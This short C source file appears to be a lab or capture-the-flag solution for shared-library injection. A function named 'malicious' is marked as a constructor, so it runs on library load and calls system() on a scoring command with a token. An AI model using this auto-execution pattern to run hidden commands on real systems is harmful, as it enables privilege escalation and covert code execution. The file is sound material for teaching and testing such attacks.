#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score cf3c1d32-1fd8-4f3a-a9b0-ec27c4953523");
}
